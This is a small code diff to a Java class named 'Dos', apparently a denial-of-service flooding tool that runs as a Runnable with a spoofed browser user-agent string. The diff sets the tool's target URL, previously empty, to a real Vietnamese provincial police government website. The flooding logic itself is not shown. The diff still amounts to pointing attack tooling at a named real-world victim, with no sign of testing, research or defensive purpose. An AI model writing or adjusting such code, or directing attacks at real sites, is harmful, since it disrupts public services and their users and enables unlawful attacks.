@@ -13,7 +13,7 @@ public class Dos implements Runnable {
     private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
 
     private static int amount = 0;
-    private static String url = "";
+    private static String url = "https://congan.bentre.gov.vn/";
     int seq;
     int type;
 
